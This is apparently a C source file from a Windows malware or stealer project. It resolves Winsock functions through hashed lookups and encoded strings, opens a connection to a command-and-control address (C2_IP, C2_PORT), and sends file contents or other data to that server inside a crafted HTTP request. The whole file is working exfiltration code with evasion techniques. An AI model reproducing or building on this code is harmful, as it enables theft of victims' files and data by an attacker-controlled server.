#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/MemoryUtils.h"
#include "../include/FileIO.h"
#include "../include/PathOps.h"
#include "../include/ntdll.h"
#include "../include/DllOps.h"
#include "../include/AddrResolution.h"
#include "../include/macros.h"
#include "../include/syscalls.h"
#include "../include/decoding.h"
#include "../include/global.h"


#include <winsock2.h>

int                 (__stdcall    *WSAStartupFunc)      (WORD, LPWSADATA);
unsigned long long  (__stdcall    *WSASocketFunc)       (int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
int                 (__stdcall    *WSAConnectFunc)      (SOCKET,const struct sockaddr*,int, LPWSABUF,LPWSABUF,LPQOS,LPQOS);
int                 (__stdcall    *SendFunc)            (SOCKET,const char FAR*,int, int);

unsigned long long  hSocket = {0};

int InitConnection() {
    void               *SocketDll   = {0};
    WSADATA             WSAStruct   = {0};
    SOCKADDR_IN         SocketAddr  = {0};

    /*the passed argument is just ws2_32.dll encoded*/
    SocketDll           = LoadDll(WS232);
    WSAStartupFunc      = GetFuncAddress(SocketDll, (HashInfo){WSASTARTUP, 10});
    WSASocketFunc       = GetFuncAddress(SocketDll, (HashInfo){WSASOCKETW, 10});
    WSAConnectFunc      = GetFuncAddress(SocketDll, (HashInfo){WSACONNECT, 10});
    SendFunc            = GetFuncAddress(SocketDll, (HashInfo){SEND, 4});

    WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0;

    hSocket = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    SocketAddr.sin_family       = AF_INET;
    SocketAddr.sin_port         = C2_PORT;
    SocketAddr.sin_addr.s_addr  = C2_IP;

    if (WSAConnectFunc(hSocket, (SOCKADDR*)&SocketAddr, sizeof(SocketAddr), NULL, NULL, NULL, NULL) != 0) {
        return -1;
    }
}


void SendData(HANDLE FileHandle, char *name, int DataSize, char *DataSizeAsString, unsigned char *buffer, unsigned char *data, int IsFile) {
    LARGE_INTEGER   wait                = {0};
    int             CurrentBuffSize     = 0;
    int             FinalBufferSize     = 0;


    unsigned char RequestHeader[365] = HTTPREQUEST;

    DecodeString(RequestHeader);

/*
    the ContentLengthField is just the below buffer encoded using the function in build tools.
    "Content-Length: "
*/
    unsigned char ContentLengthField[17] = CONTENT_LENGTH;
    DecodeString(ContentLengthField);

    /*copy the const part of the request which is request head to the allocated buffer*/
    MovMemory(RequestHeader, buffer, len(RequestHeader));

    /*append the file name to its place in the buffer*/
    ConcatString(buffer, name, len(buffer));
    ConcatString(buffer, "\r\n", len(buffer));

    /*append the content size to the buffer then append the file size to the buffer*/
    ConcatString(buffer, ContentLengthField, len(buffer));
    ConcatString(buffer, DataSizeAsString, len(buffer));
    ConcatString(buffer, "\r\n\r\n", len(buffer));

    /*
    get the size of the buffer which contains only the http request for now
    so we can shift buffer pointer to the end
    so we can write the content of the file to the same buffer to make a full http request
    */
    CurrentBuffSize = len(buffer);
    /*shift the buffer pointer to the end of the buffer*/
    buffer += CurrentBuffSize;

    if (IsFile == TRUE) {
        /*if its a file read the content of the file*/
        if (ReadFileY(FileHandle, buffer, DataSize) != 0) {
            return;
        }
    } else {
        /*if its a data move it to the buffer*/
        MovMemory(data, buffer, DataSize);
    }
    /*shift back the pointer to its original place*/
    buffer -= CurrentBuffSize;
    /*get the full size of the buffer with the file content*/
    FinalBufferSize = CurrentBuffSize + DataSize;

    /*send the buffer*/
    if (SendFunc(hSocket, buffer, FinalBufferSize, 0) == SOCKET_ERROR) {
        return;
    }

    /*wait for 1.5s*/
    wait.QuadPart = -1500 * 10000;
    NtWaitForSingleObject((HANDLE)-1, FALSE, &wait);

    FreeMemory(buffer);
}